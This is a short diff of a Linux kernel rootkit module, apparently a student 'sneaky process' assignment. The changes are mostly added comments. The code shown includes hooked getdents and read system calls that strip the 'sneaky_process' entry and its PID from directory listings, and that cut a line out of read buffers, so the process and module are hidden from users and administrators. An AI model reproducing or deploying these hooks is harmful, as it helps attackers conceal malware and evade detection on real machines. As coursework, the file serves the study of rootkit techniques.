@@ -102,15 +102,15 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
       current_dir = (struct linux_dirent *)(current_position + (char*)dirp);
       current_reclen = (int)current_dir->d_reclen;
 
-      //if found 
+      //if found, consider both the cases 
       if((strcmp(current_dir->d_name, "sneaky_process") == 0) || (strcmp(current_dir->d_name, sneaky_process_id) == 0)){
 
-        length = (size_t)( num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp));
+        length = (size_t)(num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp));
         memcpy(current_dir, (char*)current_dir + current_dir->d_reclen, length);
 	num = num - current_reclen;
 	break;
       }
-      current_position = current_position + current_reclen;
+      current_position = current_position + current_reclen; //keeep traversing 
 
     } //loop ends
     
@@ -134,10 +134,11 @@ asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
      while( *temp_ptr != '\n') 
        temp_ptr++; //traverse till you get "\n"
 
-    temp_ptr++;
+    temp_ptr++;  //skip
+
     length = (return_bytes - (ssize_t)(temp_ptr - (char*)buf));
     //printk("%d\n", (int)lenght);
-    return_bytes = (ssize_t)(return_bytes - (temp_ptr - find_ptr)); 
+    return_bytes = (ssize_t)(return_bytes - (temp_ptr - find_ptr));  //modify return bytes
     memcpy(find_ptr, temp_ptr, length); 
   }
 
